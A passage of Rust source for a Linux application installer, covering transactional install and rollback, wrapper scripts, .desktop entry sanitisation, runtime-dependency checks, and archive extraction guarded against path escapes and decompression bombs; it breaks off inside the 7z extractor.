//! Transactional installer, safe extractor, wiring, rollback, uninstall, PATH check, and Trash.

use std::fs::{self, File};
use std::io::{BufReader, Read};
use std::os::unix::fs::{PermissionsExt, symlink};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{SystemTime, UNIX_EPOCH};

use bzip2::read::BzDecoder;
use flate2::read::GzDecoder;
use tar::Archive;
use tempfile::TempDir;
use xz2::read::XzDecoder;
use zip::ZipArchive;

use crate::detect::inspect_contents;
use crate::error::EasiError;
use crate::manifest::{
    Manifest, delete_manifest, find_manifest_by_id, resolve_installed, save_manifest,
};
use crate::model::{Format, InstallPlan, InstallStep, InstallSummary};
use crate::plan::{PlanOp, detect_de_quirk, plan_ops};
use crate::roots::{InstallRoots, safe_join};

/// Records every created file/symlink/dir in order so failure or cancel rolls back cleanly.
#[derive(Debug, Default)]
pub struct Transaction {
    pub created_files: Vec<PathBuf>,
    pub created_dirs: Vec<PathBuf>,
}

impl Transaction {
    pub fn record_file(&mut self, path: PathBuf) {
        self.created_files.push(path);
    }

    pub fn record_dir(&mut self, path: PathBuf) {
        if !self.created_dirs.contains(&path) {
            self.created_dirs.push(path);
        }
    }

    pub fn rollback(&self) {
        rollback_paths(&self.created_files, &self.created_dirs);
    }
}

pub fn rollback_paths(files: &[PathBuf], dirs: &[PathBuf]) {
    for path in files.iter().rev() {
        let _ = fs::remove_file(path);
    }
    for dir in dirs.iter().rev() {
        let _ = fs::remove_dir(dir);
    }
}

fn check_cancelled(cancel_flag: &AtomicBool) -> Result<(), EasiError> {
    if cancel_flag.load(Ordering::Relaxed) {
        return Err(EasiError::Desktop("installation cancelled".into()));
    }
    Ok(())
}

/// Execute a full transactional install against `roots`.
/// On any error, rolls back all created paths before returning `Err`.
pub fn execute_install<P>(
    roots: &InstallRoots,
    plan: &InstallPlan,
    replace_existing: bool,
    cancel_flag: &AtomicBool,
    mut on_progress: P,
) -> Result<InstallSummary, EasiError>
where
    P: FnMut(InstallStep, u8),
{
    on_progress(InstallStep::Preparing, 5);
    check_cancelled(cancel_flag)?;

    let old_manifest = if replace_existing {
        find_manifest_by_id(roots, &plan.app_id)
    } else {
        None
    };

    // Atomic replace backup: move existing app directory aside before replacing so a failed
    // or cancelled update restores the previous working app cleanly.
    let mut backup_dir: Option<(PathBuf, PathBuf)> = None;
    let mut old_external_backup: Vec<(PathBuf, PathBuf)> = Vec::new();
    let backup_tmp = TempDir::new()?;

    if let Some(old) = &old_manifest {
        if old.install_dir.exists() {
            let safe = sanitize_dir_name(&old.name);
            let aside = roots.applications_dir.join(format!(".{safe}.easi-backup"));
            if aside.exists() {
                let _ = fs::remove_dir_all(&aside);
            }
            if fs::rename(&old.install_dir, &aside).is_ok() {
                backup_dir = Some((aside, old.install_dir.clone()));
            }
        }
        for (i, path) in old
            .created_files
            .iter()
            .filter(|p| !p.starts_with(&old.install_dir))
            .enumerate()
        {
            if let Ok(meta) = fs::symlink_metadata(path) {
                if !meta.file_type().is_symlink() {
                    let saved = backup_tmp.path().join(format!("ext_{i}"));
                    if fs::copy(path, &saved).is_ok() {
                        old_external_backup.push((saved, path.clone()));
                    }
                }
                let _ = fs::remove_file(path);
            }
        }
    }

    let mut tx = Transaction::default();
    let result = run_install_ops(
        roots,
        plan,
        old_manifest.as_ref(),
        &mut tx,
        cancel_flag,
        &mut on_progress,
    );

    match result {
        Ok(summary) => {
            if let Some((aside, _)) = backup_dir {
                let _ = fs::remove_dir_all(aside);
            }
            Ok(summary)
        }
        Err(err) => {
            tx.rollback();
            // Restore previous working app if this was a replace/update.
            if let Some((aside, orig)) = backup_dir {
                let _ = fs::rename(aside, orig);
            }
            for (saved, orig) in old_external_backup {
                if let Some(parent) = orig.parent() {
                    let _ = fs::create_dir_all(parent);
                }
                let _ = fs::copy(saved, orig);
            }
            if let Some(old) = &old_manifest {
                let _ = save_manifest(roots, old);
            }
            Err(err)
        }
    }
}

fn run_install_ops<P>(
    roots: &InstallRoots,
    plan: &InstallPlan,
    old_manifest: Option<&Manifest>,
    tx: &mut Transaction,
    cancel_flag: &AtomicBool,
    on_progress: &mut P,
) -> Result<InstallSummary, EasiError>
where
    P: FnMut(InstallStep, u8),
{
    // Old install files were already moved aside atomically in `execute_install`.
    let safe_dir_name = sanitize_dir_name(&plan.name);
    let app_dir = roots.applications_dir.join(&safe_dir_name);
    if is_path_on_noexec_mount(&roots.applications_dir) {
        return Err(EasiError::NoExecMount(roots.applications_dir.clone()));
    }
    if app_dir.exists() && old_manifest.is_none() {
        return Err(EasiError::UnmanagedOverwrite(app_dir));
    }

    let ops = plan_ops(plan.format, plan.kind);
    let mut resolved_exec: Option<PathBuf> = None;
    let mut stripped_prefix: Option<String> = None;
    let mut extracted_icon_bytes: Option<(String, Vec<u8>)> = plan
        .icon_path
        .as_ref()
        .zip(plan.icon_bytes.as_ref())
        .map(|(p, b)| (p.clone(), b.clone()));
    let mut installed_icon_name: Option<String> = None;

    for (idx, op) in ops.iter().enumerate() {
        check_cancelled(cancel_flag)?;
        let pct = ((idx + 1) * 90 / ops.len().max(1)) as u8;
        match op {
            PlanOp::CopyAppImage | PlanOp::CopyBareElf => {
                on_progress(InstallStep::Extracting, pct);
                fs::create_dir_all(&app_dir)?;
                tx.record_dir(app_dir.clone());
                let fname = plan
                    .source_path
                    .file_name()
                    .map(|n| n.to_string_lossy().into_owned())
                    .unwrap_or_else(|| plan.app_id.clone());
                let dest = safe_join(&app_dir, Path::new(&fname))?;
                fs::copy(&plan.source_path, &dest)?;
                // Strip setuid/setgid, ensure executable.
                let mut perms = fs::metadata(&dest)?.permissions();
                perms.set_mode((perms.mode() & !0o6000) | 0o755);
                fs::set_permissions(&dest, perms)?;
                tx.record_file(dest.clone());
                // Wrap AppImages on NixOS (`appimage-run`) or FUSE2-less distros
                // (`APPIMAGE_EXTRACT_AND_RUN=1`) so they always launch cleanly.
                let nix_wrap =
                    matches!(op, PlanOp::CopyAppImage) && is_nixos() && has_appimage_run();
                let fuse_wrap =
                    matches!(op, PlanOp::CopyAppImage) && !is_nixos() && !has_libfuse2();
                if nix_wrap || fuse_wrap {
                    let bin_name = plan
                        .app_id
                        .strip_prefix("easi.")
                        .unwrap_or(&plan.app_id)
                        .split('.')
                        .next_back()
                        .unwrap_or(&plan.app_id)
                        .to_ascii_lowercase();
                    let wrapper = safe_join(&app_dir, Path::new(&format!("{bin_name}-run.sh")))?;
                    let dest_q = shell_single_quote(&dest.to_string_lossy());
                    let script = if nix_wrap {
                        format!("#!/bin/sh\nexec appimage-run {dest_q} \"$@\"\n")
                    } else {
                        format!(
                            "#!/bin/sh\nexport APPIMAGE_EXTRACT_AND_RUN=1\nexec {dest_q} \"$@\"\n"
                        )
                    };
                    fs::write(&wrapper, script)?;
                    fs::set_permissions(&wrapper, fs::Permissions::from_mode(0o755))?;
                    tx.record_file(wrapper.clone());
                    resolved_exec = Some(wrapper);
                } else {
                    resolved_exec = Some(dest);
                }
            }
            PlanOp::CopyJarWithWrapper => {
                on_progress(InstallStep::Extracting, pct);
                fs::create_dir_all(&app_dir)?;
                tx.record_dir(app_dir.clone());
                let fname = plan
                    .source_path
                    .file_name()
                    .map(|n| n.to_string_lossy().into_owned())
                    .unwrap_or_else(|| format!("{}.jar", plan.app_id));
                let jar_dest = safe_join(&app_dir, Path::new(&fname))?;
                fs::copy(&plan.source_path, &jar_dest)?;
                tx.record_file(jar_dest.clone());

                let bin_name = plan
                    .app_id
                    .strip_prefix("easi.")
                    .unwrap_or(&plan.app_id)
                    .to_ascii_lowercase();
                let wrapper = safe_join(&app_dir, Path::new(&bin_name))?;
                let jar_q = shell_single_quote(&jar_dest.to_string_lossy());
                let script = format!("#!/bin/sh\nexec java -jar {jar_q} \"$@\"\n");
                fs::write(&wrapper, script)?;
                fs::set_permissions(&wrapper, fs::Permissions::from_mode(0o755))?;
                tx.record_file(wrapper.clone());
                resolved_exec = Some(wrapper);
            }
            PlanOp::RunShellInstaller => {
                on_progress(InstallStep::Extracting, pct);
                fs::create_dir_all(&app_dir)?;
                tx.record_dir(app_dir.clone());
                // Snapshot allowed roots before and after so every file created by the script
                // is recorded in the manifest for clean uninstall.
                let watched = [
                    app_dir.clone(),
                    roots.desktop_dir.clone(),
                    roots.icons_dir.clone(),
                    roots.bin_dir.clone(),
                ];
                let before = snapshot_files(&watched);
                let staging = TempDir::new()?;
                // Cap process count (`ulimit -u 256`) to neutralize fork bombs, pass `--` before
                // script path, and poll with a 5-minute timeout + cancel_flag kill guard.
                let mut child = Command::new("sh")
                    .args([
                        "-c",
                        "ulimit -u 256 2>/dev/null || true; exec sh -- \"$1\"",
                        "_",
                    ])
                    .arg(&plan.source_path)
                    .current_dir(staging.path())
                    .env("HOME", &roots.home_dir)
                    .env("PREFIX", &app_dir)
                    .env("EASI_INSTALL_DIR", &app_dir)
                    .spawn()?;
                let started = std::time::Instant::now();
                let max_duration = std::time::Duration::from_secs(300);
                let status = loop {
                    if let Some(st) = child.try_wait()? {
                        break st;
                    }
                    if cancel_flag.load(Ordering::Relaxed) {
                        let _ = child.kill();
                        let _ = child.wait();
                        return Err(EasiError::Desktop("installation cancelled".into()));
                    }
                    if started.elapsed() > max_duration {
                        let _ = child.kill();
                        let _ = child.wait();
                        return Err(EasiError::Desktop(
                            "installer script exceeded 5-minute timeout and was terminated".into(),
                        ));
                    }
                    std::thread::sleep(std::time::Duration::from_millis(50));
                };
                if !status.success() {
                    return Err(EasiError::Desktop(format!(
                        "installer script exited with status {status}"
                    )));
                }
                let after = snapshot_files(&watched);
                for path in after {
                    if !before.contains(&path) {
                        tx.record_file(path);
                    }
                }
            }
            PlanOp::ExtractAppImageAssets => {
                on_progress(InstallStep::Extracting, pct);
                if let Ok(contents) = inspect_contents(&plan.source_path, plan.format)
                    && let Some(icon_rel) = &plan.icon_path
                    && let Some((name, bytes)) = contents
                        .embedded_icons
                        .into_iter()
                        .find(|(p, _)| p == icon_rel)
                {
                    extracted_icon_bytes = Some((name, bytes));
                }
            }
            PlanOp::ExtractArchive => {
                on_progress(InstallStep::Extracting, pct);
                let staging = TempDir::new()?;
                extract_archive_safe(&plan.source_path, plan.format, staging.path())?;
                fs::create_dir_all(&app_dir)?;
                tx.record_dir(app_dir.clone());
                let copy_src = if let Some(top) = single_top_dir(staging.path()) {
                    stripped_prefix = Some(top.clone());
                    staging.path().join(top)
                } else {
                    staging.path().to_path_buf()
                };
                copy_tree_recorded(&copy_src, &app_dir, tx)?;
                let rel_exec = strip_top_prefix(&plan.main_exec, stripped_prefix.as_deref());
                let exec_path = safe_join(&app_dir, Path::new(&rel_exec))?;
                if exec_path.exists() {
                    let mut perms = fs::metadata(&exec_path)?.permissions();
                    perms.set_mode((perms.mode() & !0o6000) | 0o755);
                    fs::set_permissions(&exec_path, perms)?;
                }
                resolved_exec = Some(exec_path);
            }
            PlanOp::WireIcons => {
                on_progress(InstallStep::Wiring, pct);
                let icon_name = plan.app_id.clone();
                if let Some((rel, bytes)) = extracted_icon_bytes.take() {
                    if let Some(icon_dest) =
                        write_hicolor_icon(roots, &icon_name, &rel, &bytes, tx)?
                    {
                        installed_icon_name = Some(icon_dest.to_string_lossy().into_owned());
                    }
                } else if let Some(icon_rel) = &plan.icon_path {
                    let rel_icon = strip_top_prefix(icon_rel, stripped_prefix.as_deref());
                    let src = safe_join(&app_dir, Path::new(&rel_icon))?;
                    if src.exists() {
                        let bytes = fs::read(&src)?;
                        if let Some(icon_dest) =
                            write_hicolor_icon(roots, &icon_name, icon_rel, &bytes, tx)?
                        {
                            installed_icon_name = Some(icon_dest.to_string_lossy().into_owned());
                        }
                    }
                } else if let Some((asar_rel, bytes)) =
                    crate::detect::extract_icon_from_asar_path(&app_dir.join("resources/app.asar"))
                    && let Some(icon_dest) =
                        write_hicolor_icon(roots, &icon_name, &asar_rel, &bytes, tx)?
                {
                    installed_icon_name = Some(icon_dest.to_string_lossy().into_owned());
                }
            }
            PlanOp::WireDesktop => {
                on_progress(InstallStep::Wiring, pct);
                if let Some(exec_path) = &resolved_exec {
                    fs::create_dir_all(&roots.desktop_dir)?;
                    let desktop_name = format!("{}.desktop", plan.app_id);
                    let desktop_path = safe_join(&roots.desktop_dir, Path::new(&desktop_name))?;
                    if desktop_path.exists() && old_manifest.is_none() {
                        return Err(EasiError::UnmanagedOverwrite(desktop_path));
                    }
                    let content =
                        render_desktop_entry(plan, exec_path, installed_icon_name.as_deref());
                    fs::write(&desktop_path, content)?;
                    tx.record_file(desktop_path);
                }
            }
            PlanOp::WireBinSymlink => {
                on_progress(InstallStep::Wiring, pct);
                if let Some(exec_path) = &resolved_exec {
                    fs::create_dir_all(&roots.bin_dir)?;
                    let bin_name = plan
                        .app_id
                        .strip_prefix("easi.")
                        .unwrap_or(&plan.app_id)
                        .split('.')
                        .next_back()
                        .unwrap_or(&plan.app_id)
                        .to_ascii_lowercase();
                    let link_path = safe_join(&roots.bin_dir, Path::new(&bin_name))?;
                    let is_dangling_symlink =
                        link_path.symlink_metadata().is_ok() && !link_path.exists();
                    if link_path.exists() || link_path.symlink_metadata().is_ok() {
                        if old_manifest.is_some() || is_dangling_symlink {
                            let _ = fs::remove_file(&link_path);
                        } else {
                            return Err(EasiError::UnmanagedOverwrite(link_path));
                        }
                    }
                    symlink(exec_path, &link_path)?;
                    tx.record_file(link_path);
                }
            }
            PlanOp::RefreshDesktop => {
                on_progress(InstallStep::RefreshingDesktop, pct);
                refresh_desktop_caches(roots);
            }
            PlanOp::WriteManifest => {
                on_progress(InstallStep::SavingManifest, 98);
                let source_filename = plan
                    .source_path
                    .file_name()
                    .map(|n| n.to_string_lossy().into_owned())
                    .unwrap_or_default();
                let manifest = Manifest {
                    app_id: plan.app_id.clone(),
                    name: plan.name.clone(),
                    version: plan.version.clone(),
                    source_filename,
                    kind: plan.kind,
                    install_dir: app_dir.clone(),
                    developer: plan.developer.clone(),
                    origin_url: plan.origin_url.clone(),
                    signature_summary: plan.signature_summary.clone(),
                    update_source: plan.update_source.clone(),
                    adopted: false,
                    created_files: tx.created_files.clone(),
                    created_dirs: tx.created_dirs.clone(),
                };
                save_manifest(roots, &manifest)?;
            }
        }
    }

    Ok(InstallSummary {
        app_id: plan.app_id.clone(),
        name: plan.name.clone(),
        version: plan.version.clone(),
        source_path: plan.source_path.clone(),
        install_dir: app_dir,
        kind: plan.kind,
        bin_on_path: is_bin_dir_on_path(&roots.bin_dir),
    })
}

/// Check whether FUSE2 (`libfuse.so.2`) is present on standard Linux library paths.
pub fn has_libfuse2() -> bool {
    const CANDIDATES: &[&str] = &[
        "/usr/lib/libfuse.so.2",
        "/usr/lib64/libfuse.so.2",
        "/usr/lib/x86_64-linux-gnu/libfuse.so.2",
        "/usr/lib/aarch64-linux-gnu/libfuse.so.2",
        "/lib/x86_64-linux-gnu/libfuse.so.2",
        "/lib/aarch64-linux-gnu/libfuse.so.2",
        "/lib64/libfuse.so.2",
    ];
    CANDIDATES.iter().any(|p| Path::new(p).exists())
}

pub fn is_nixos() -> bool {
    Path::new("/etc/NIXOS").exists()
}

pub fn has_appimage_run() -> bool {
    Command::new("appimage-run")
        .arg("--version")
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok()
}

pub fn has_nix_ld() -> bool {
    Path::new("/run/current-system/sw/share/nix-ld").exists()
        || std::env::var_os("NIX_LD").is_some()
}

pub fn is_musl_only_host() -> bool {
    let has_musl = Path::new("/lib/ld-musl-x86_64.so.1").exists()
        || Path::new("/lib/ld-musl-aarch64.so.1").exists();
    let has_glibc = Path::new("/lib64/ld-linux-x86-64.so.2").exists()
        || Path::new("/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2").exists()
        || Path::new("/lib/ld-linux-aarch64.so.1").exists()
        || Path::new("/usr/lib/ld-linux-x86-64.so.2").exists();
    has_musl && !has_glibc
}

pub fn has_gcompat() -> bool {
    Path::new("/lib/libgcompat.so.0").exists() || Path::new("/usr/lib/libgcompat.so.0").exists()
}

pub fn has_java() -> bool {
    Command::new("java")
        .arg("-version")
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok()
}

/// Distro-aware install command lookup table for missing runtime dependencies.
pub fn distro_install_cmd(pkg_kind: &str) -> String {
    let os_release = fs::read_to_string("/etc/os-release")
        .unwrap_or_default()
        .to_ascii_lowercase();
    struct CmdRow {
        distro_needle: &'static str,
        gcompat_cmd: &'static str,
        java_cmd: &'static str,
    }
    const TABLE: &[CmdRow] = &[
        CmdRow {
            distro_needle: "alpine",
            gcompat_cmd: "sudo apk add gcompat",
            java_cmd: "sudo apk add openjdk21-jre",
        },
        CmdRow {
            distro_needle: "postmarketos",
            gcompat_cmd: "sudo apk add gcompat",
            java_cmd: "sudo apk add openjdk21-jre",
        },
        CmdRow {
            distro_needle: "chimera",
            gcompat_cmd: "doas apk add gcompat",
            java_cmd: "doas apk add openjdk21-jre",
        },
        CmdRow {
            distro_needle: "arch",
            gcompat_cmd: "sudo pacman -S glibc",
            java_cmd: "sudo pacman -S jre-openjdk",
        },
        CmdRow {
            distro_needle: "cachyos",
            gcompat_cmd: "sudo pacman -S glibc",
            java_cmd: "sudo pacman -S jre-openjdk",
        },
        CmdRow {
            distro_needle: "fedora",
            gcompat_cmd: "sudo dnf install glibc",
            java_cmd: "sudo dnf install java-latest-openjdk",
        },
        CmdRow {
            distro_needle: "ubuntu",
            gcompat_cmd: "sudo apt install libc6",
            java_cmd: "sudo apt install default-jre",
        },
        CmdRow {
            distro_needle: "mint",
            gcompat_cmd: "sudo apt install libc6",
            java_cmd: "sudo apt install default-jre",
        },
        CmdRow {
            distro_needle: "debian",
            gcompat_cmd: "sudo apt install libc6",
            java_cmd: "sudo apt install default-jre",
        },
    ];
    for row in TABLE {
        if os_release.contains(row.distro_needle) {
            return match pkg_kind {
                "gcompat" => row.gcompat_cmd.to_string(),
                "java" => row.java_cmd.to_string(),
                _ => String::new(),
            };
        }
    }
    match pkg_kind {
        "gcompat" => {
            "Install `gcompat` using your distro's package manager (e.g. `sudo apk add gcompat`)"
                .into()
        }
        "java" => "Install a Java runtime (OpenJDK JRE) using your distro's package manager".into(),
        _ => String::new(),
    }
}

/// Check whether `path` resides on a `noexec` mount by inspecting `/proc/self/mounts`.
pub fn is_path_on_noexec_mount(path: &Path) -> bool {
    let Ok(mounts) = fs::read_to_string("/proc/self/mounts") else {
        return false;
    };
    let target = fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
    parse_noexec_from_mounts(&mounts, &target)
}

pub fn parse_noexec_from_mounts(mounts: &str, target: &Path) -> bool {
    let target_str = target.to_string_lossy();
    let mut best_len = 0usize;
    let mut best_noexec = false;

    for line in mounts.lines() {
        let mut parts = line.split_whitespace();
        let _dev = parts.next();
        let Some(mount_point) = parts.next() else {
            continue;
        };
        let _fs = parts.next();
        let Some(opts) = parts.next() else {
            continue;
        };
        let matches = mount_point == "/"
            || target_str == mount_point
            || target_str.starts_with(&format!("{mount_point}/"));
        if matches && mount_point.len() >= best_len {
            best_len = mount_point.len();
            best_noexec = opts.split(',').any(|o| o == "noexec");
        }
    }
    best_noexec
}

/// Safely list missing shared libraries for an ELF binary using the system dynamic linker
/// (`--list`), never executing the untrusted binary's own `PT_INTERP`.
pub fn missing_shared_libs(elf_path: &Path) -> Vec<String> {
    const LOADERS: &[&str] = &[
        "/lib64/ld-linux-x86-64.so.2",
        "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
        "/lib/ld-linux-aarch64.so.1",
        "/usr/lib/ld-linux-x86-64.so.2",
    ];
    let Some(loader) = LOADERS.iter().find(|p| Path::new(p).exists()) else {
        return vec![];
    };
    let Ok(out) = Command::new(loader).args(["--list"]).arg(elf_path).output() else {
        return vec![];
    };
    let stdout = String::from_utf8_lossy(&out.stdout);
    let mut missing = Vec::new();
    for line in stdout.lines() {
        if line.contains("=> not found")
            && let Some(lib) = line.split_whitespace().next()
        {
            missing.push(lib.to_string());
        }
    }
    missing
}

/// Fail loudly with an actionable terminal command if the host lacks required runtime
/// dependencies to execute this package format.
pub fn check_host_runtime_deps(format: Format, has_elf: bool) -> Result<(), EasiError> {
    let is_appimage = matches!(format, Format::AppImageType1 | Format::AppImageType2);
    let needs_glibc = is_appimage || format == Format::BareElf || has_elf;

    if needs_glibc && is_musl_only_host() && !has_gcompat() {
        return Err(EasiError::MissingRuntimeDependency {
            detail: "this musl-based system does not have `gcompat` installed to run glibc binaries/AppImages"
                .into(),
            fix_command: distro_install_cmd("gcompat"),
        });
    }

    if needs_glibc && is_nixos() && !has_appimage_run() && !has_nix_ld() {
        return Err(EasiError::MissingRuntimeDependency {
            detail: "NixOS requires `appimage-run` or `nix-ld` to run standard Linux binaries/AppImages"
                .into(),
            fix_command: "nix-shell -p appimage-run   # or set `programs.nix-ld.enable = true;` in configuration.nix"
                .into(),
        });
    }

    if format == Format::Jar && !has_java() {
        return Err(EasiError::MissingRuntimeDependency {
            detail: "Java (`java`) is not installed to run .jar applications".into(),
            fix_command: distro_install_cmd("java"),
        });
    }

    Ok(())
}

fn sanitize_dir_name(name: &str) -> String {
    let cleaned: String = name
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == ' ' || c == '-' || c == '_' || c == '.' {
                c
            } else {
                '-'
            }
        })
        .collect();
    let trimmed = cleaned.trim().trim_matches('.');
    if trimmed.is_empty() {
        "App".into()
    } else {
        trimmed.to_string()
    }
}

fn single_top_dir(dir: &Path) -> Option<String> {
    let mut entries = fs::read_dir(dir).ok()?.filter_map(Result::ok);
    let first = entries.next()?;
    if entries.next().is_some() {
        return None;
    }
    if first.file_type().ok()?.is_dir() {
        Some(first.file_name().to_string_lossy().into_owned())
    } else {
        None
    }
}

fn strip_top_prefix(rel: &str, prefix: Option<&str>) -> String {
    let cleaned = rel.trim_start_matches("./");
    if let Some(p) = prefix
        && let Some(rest) = cleaned.strip_prefix(&format!("{p}/"))
    {
        return rest.to_string();
    }
    cleaned.to_string()
}

fn write_hicolor_icon(
    roots: &InstallRoots,
    icon_name: &str,
    rel_src: &str,
    bytes: &[u8],
    tx: &mut Transaction,
) -> Result<Option<PathBuf>, EasiError> {
    let lower = rel_src.to_ascii_lowercase();
    let is_svg =
        lower.ends_with(".svg") || bytes.starts_with(b"<svg") || bytes.starts_with(b"<?xml");
    let is_png = lower.ends_with(".png") || bytes.starts_with(b"\x89PNG");
    let (subdir, ext) = if is_svg {
        ("scalable/apps", "svg")
    } else if is_png {
        ("256x256/apps", "png")
    } else {
        return Ok(None);
    };
    let dir = roots.icons_dir.join(subdir);
    fs::create_dir_all(&dir)?;
    let dest = safe_join(&dir, Path::new(&format!("{icon_name}.{ext}")))?;
    fs::write(&dest, bytes)?;
    tx.record_file(dest.clone());
    Ok(Some(dest))
}

/// Safe metadata keys allowed from an untrusted embedded `.desktop` file's `[Desktop Entry]`
/// section. All `Exec=`, `TryExec=`, and `[Desktop Action ...]` blocks are never passed through.
const SAFE_DESKTOP_KEYS: &[&str] = &[
    "Name=",
    "GenericName=",
    "Comment=",
    "Categories=",
    "Keywords=",
    "MimeType=",
    "StartupNotify=",
    "StartupWMClass=",
    "Terminal=",
];

fn sanitize_desktop_value(s: &str) -> String {
    s.replace(['\r', '\n'], " ").trim().to_string()
}

fn shell_single_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

fn render_desktop_entry(plan: &InstallPlan, exec_path: &Path, icon_name: Option<&str>) -> String {
    let exec_quoted = quote_desktop_exec(exec_path);
    let mut lines = vec![
        "[Desktop Entry]".to_string(),
        "Type=Application".to_string(),
    ];
    let mut wrote_name = false;
    let mut wrote_terminal = false;
    let mut wrote_wm = false;

    if let Some(existing) = &plan.desktop_entry {
        let mut in_main = false;
        for raw_line in existing.lines() {
            let trimmed = raw_line.trim();
            if trimmed.starts_with('[') && trimmed.ends_with(']') {
                in_main = trimmed == "[Desktop Entry]";
                continue;
            }
            if !in_main || trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }
            if SAFE_DESKTOP_KEYS.iter().any(|k| trimmed.starts_with(k)) {
                let clean = sanitize_desktop_value(trimmed);
                if clean.starts_with("Name=") {
                    wrote_name = true;
                } else if clean.starts_with("Terminal=") {
                    wrote_terminal = true;
                } else if clean.starts_with("StartupWMClass=") {
                    wrote_wm = true;
                }
                lines.push(clean);
            }
        }
    }

    if !wrote_name {
        lines.push(format!("Name={}", sanitize_desktop_value(&plan.name)));
    }
    lines.push(format!("Exec={exec_quoted}"));
    if !wrote_terminal {
        lines.push("Terminal=false".to_string());
    }
    if let Some(ic) = icon_name {
        lines.push(format!("Icon={}", sanitize_desktop_value(ic)));
    }
    if !wrote_wm && let Some(wm) = &plan.startup_wm_class {
        lines.push(format!("StartupWMClass={}", sanitize_desktop_value(wm)));
    }
    lines.join("\n") + "\n"
}

fn quote_desktop_exec(path: &Path) -> String {
    let s = sanitize_desktop_value(&path.to_string_lossy());
    if s.contains(' ') {
        format!("\"{s}\"")
    } else {
        s
    }
}

/// Extract archive safely into `dest_root`: canonicalized paths, no escapes, setuid stripped.
pub fn extract_archive_safe(
    path: &Path,
    format: Format,
    dest_root: &Path,
) -> Result<(), EasiError> {
    let extracted = match format {
        Format::Tar => extract_tar_safe(BufReader::new(File::open(path)?), dest_root),
        Format::TarGz => {
            extract_tar_safe(GzDecoder::new(BufReader::new(File::open(path)?)), dest_root)
        }
        Format::TarXz => {
            extract_tar_safe(XzDecoder::new(BufReader::new(File::open(path)?)), dest_root)
        }
        Format::TarZst => {
            let dec = zstd::stream::read::Decoder::new(BufReader::new(File::open(path)?))
                .map_err(|e| EasiError::Archive(e.to_string()))?;
            extract_tar_safe(dec, dest_root)
        }
        Format::TarBz2 => {
            extract_tar_safe(BzDecoder::new(BufReader::new(File::open(path)?)), dest_root)
        }
        Format::TarLz4 => extract_tar_safe(
            lz4_flex::frame::FrameDecoder::new(BufReader::new(File::open(path)?)),
            dest_root,
        ),
        Format::Zip => extract_zip_safe(path, dest_root),
        Format::SevenZ => extract_sevenz_safe(path, dest_root),
        Format::AppImageType1
        | Format::AppImageType2
        | Format::BareElf
        | Format::Jar
        | Format::ShellInstaller => return Ok(()),
    };
    extracted?;
    // The per-entry lexical check cannot see links that traverse other links (chains like
    // `l1 -> ../..` then `l1/x/y/l2 -> ../../../..`), so re-resolve every link on disk.
    let root = fs::canonicalize(dest_root)?;
    reject_escaping_symlinks(&root, &root)
}

/// Symlinks followed while resolving one link before it counts as a loop (the kernel's ELOOP cap).
const MAX_SYMLINK_HOPS: usize = 40;

/// Walk `dir` without following links and resolve each symlink by hand against the real tree,
/// rejecting absolute targets, loops, and any `..` that climbs above `root` (canonical).
/// Missing components are taken lexically, so dangling links are judged by the same rule.
fn reject_escaping_symlinks(root: &Path, dir: &Path) -> Result<(), EasiError> {
    for entry in fs::read_dir(dir)? {
        let path = entry?.path();
        let meta = fs::symlink_metadata(&path)?;
        if meta.is_dir() {
            reject_escaping_symlinks(root, &path)?;
            continue;
        }
        if !meta.file_type().is_symlink() {
            continue;
        }
        let escape = || EasiError::PathEscape(path.to_string_lossy().into_owned());
        let rel = path.strip_prefix(root).map_err(|_| escape())?;
        // `resolved` only ever holds real directories or missing names, never a symlink.
        let mut resolved = PathBuf::new();
        let mut pending: Vec<std::ffi::OsString> = rel
            .components()
            .rev()
            .map(|c| c.as_os_str().to_os_string())
            .collect();
        let mut hops = 0usize;
        while let Some(comp) = pending.pop() {
            match Path::new(&comp).components().next() {
                Some(std::path::Component::Normal(name)) => {
                    let candidate = root.join(&resolved).join(name);
                    if !fs::symlink_metadata(&candidate).is_ok_and(|m| m.file_type().is_symlink()) {
                        resolved.push(name);
                        continue;
                    }
                    hops += 1;
                    let target = fs::read_link(&candidate)?;
                    if hops > MAX_SYMLINK_HOPS || target.has_root() {
                        return Err(escape());
                    }
                    // Relative targets resolve from the link's real parent, which is `resolved`.
                    pending.extend(
                        target
                            .components()
                            .rev()
                            .map(|c| c.as_os_str().to_os_string()),
                    );
                }
                Some(std::path::Component::ParentDir) => {
                    if !resolved.pop() {
                        return Err(escape());
                    }
                }
                Some(std::path::Component::CurDir) | None => {}
                Some(std::path::Component::RootDir | std::path::Component::Prefix(_)) => {
                    return Err(escape());
                }
            }
        }
        // Same rule as the per-entry check: a link to the extraction root itself is rejected.
        if resolved.as_os_str().is_empty() {
            return Err(escape());
        }
    }
    Ok(())
}

/// Hard cap on total bytes extracted from a single archive (guards against decompression bombs).
const MAX_EXTRACT_BYTES: u64 = 16 * 1024 * 1024 * 1024;

fn copy_limited<R: Read + ?Sized>(
    reader: &mut R,
    dest: &Path,
    extracted_total: &mut u64,
) -> Result<(), EasiError> {
    if dest
        .symlink_metadata()
        .is_ok_and(|m| m.file_type().is_symlink())
    {
        fs::remove_file(dest)?;
    }
    let remaining = MAX_EXTRACT_BYTES.saturating_sub(*extracted_total);
    let mut limited = reader.take(remaining.saturating_add(1));
    let mut out = File::create(dest)?;
    let copied = std::io::copy(&mut limited, &mut out)?;
    *extracted_total = extracted_total.saturating_add(copied);
    if *extracted_total > MAX_EXTRACT_BYTES {
        let _ = fs::remove_file(dest);
        return Err(EasiError::Archive(
            "archive exceeds maximum safe extracted size (16 GiB)".into(),
        ));
    }
    Ok(())
}

fn extract_sevenz_safe(path: &Path, dest_root: &Path) -> Result<(), EasiError> {
    let mut reader = sevenz_rust::SevenZReader::open(path, sevenz_rust::Password::empty())
        .map_err(|e| EasiError::Archive(e.to_string()))?;
    let mut total = 0u64;
    let mut count = 0usize;
    reader
        .for_each_entries(|entry, data| {
            count += 1;
            if count > crate::detect::MAX_ARCHIVE_ENTRIES {
